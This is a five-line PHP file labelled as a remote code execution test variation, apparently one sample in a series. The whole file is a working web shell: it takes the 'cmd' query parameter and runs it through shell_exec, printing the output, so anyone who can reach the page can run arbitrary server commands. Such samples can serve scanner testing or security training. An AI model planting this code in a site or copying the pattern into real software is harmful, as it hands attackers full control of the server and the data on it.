<?php
// RCE test variation #10
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>